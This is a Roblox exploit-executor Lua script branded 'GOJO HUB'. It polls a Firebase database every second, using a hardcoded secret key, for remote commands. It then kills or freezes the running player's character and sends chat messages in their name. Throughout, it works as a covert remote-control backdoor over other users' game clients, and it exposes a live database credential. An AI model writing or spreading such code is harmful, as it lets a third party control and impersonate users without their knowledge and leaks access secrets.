-- ↓ Configurações e serviços
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerName = player.Name

local firebaseUrl = "https://gojo-hub-default-rtdb.firebaseio.com/"
local secretKey = "tAxUKU1BgidFb2xFco4FRYYz02y86gUw8ugZNjYf"

local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request

----------------------------------------------------------------
-- CHAT
----------------------------------------------------------------
local function sendChatMessage(message)
    pcall(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:SendAsync(message)
        else
            local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
            chatEvent:FireServer(message, "All")
        end
    end)
end

----------------------------------------------------------------
-- KILL PLAYER
----------------------------------------------------------------
local function respawnPlayer()
    if player and player.Character then
        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
        else
            player.Character:Destroy()
        end
        warn("[GOJO HUB] Kill executado")
    end
end

local function checkKillCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/kill_player.json?auth="..secretKey)
    end)
    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.target == playerName and data.extra and data.extra.action == "kill" then
            respawnPlayer()
            -- Apaga no Firebase
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl.."commands/kill_player.json?auth="..secretKey,
                    Method = "DELETE",
                    Headers = {["Content-Type"]="application/json"},
                })
            end
        end
    end
end

----------------------------------------------------------------
-- VERIFIQUE
----------------------------------------------------------------
local function checkVerifiqueCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/verifique.json?auth="..secretKey)
    end)
    if success and response and response ~= "null" then
        sendChatMessage("GOJO_user")
        if requestFunc then
            requestFunc({
                Url = firebaseUrl.."commands/verifique.json?auth="..secretKey,
                Method = "DELETE",
                Headers = {["Content-Type"]="application/json"},
            })
        end
    end
end

----------------------------------------------------------------
-- SEND MESSAGE
----------------------------------------------------------------
local function checkChatCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/send_message.json?auth="..secretKey)
    end)
    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.target == "all" or data.target == playerName then
            sendChatMessage(data.message)
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl.."commands/send_message.json?auth="..secretKey,
                    Method = "DELETE",
                    Headers = {["Content-Type"]="application/json"},
                })
            end
        end
    end
end

----------------------------------------------------------------
-- JAIL
----------------------------------------------------------------
local isJailed = false
local jailConnection

local function freezeCharacter()
    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")

    if humanoid and hrp then
        humanoid.PlatformStand = true
        hrp.Anchored = true
        hrp.Velocity = Vector3.new(0,0,0)
        hrp.RotVelocity = Vector3.new(0,0,0)
    end
end

local function unfreezeCharacter()
    local character = player.Character
    if not character then return end

    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local hrp = character:FindFirstChild("HumanoidRootPart")

    if humanoid and hrp then
        humanoid.PlatformStand = false
        hrp.Anchored = false
    end
end

local function enableJail()
    if isJailed then return end
    isJailed = true
    freezeCharacter()

    player.CharacterAdded:Connect(function()
        if isJailed then
            task.wait(0.5)
            freezeCharacter()
        end
    end)

    jailConnection = RunService.RenderStepped:Connect(function()
        if isJailed then
            freezeCharacter()
        end
    end)
end

local function disableJail()
    isJailed = false
    unfreezeCharacter()
    if jailConnection then
        jailConnection:Disconnect()
        jailConnection = nil
    end
end

local function checkJailCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/jail/"..playerName..".json?auth="..secretKey)
    end)
    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.status == true then
            enableJail()
        else
            disableJail()
        end
    else
        disableJail()
    end
end

----------------------------------------------------------------
-- LOOP 24/7
----------------------------------------------------------------
task.spawn(function()
    while true do
        task.wait(1)
        checkKillCommand()
        checkVerifiqueCommand()
        checkChatCommand()
        checkJailCommand()
    end
end)
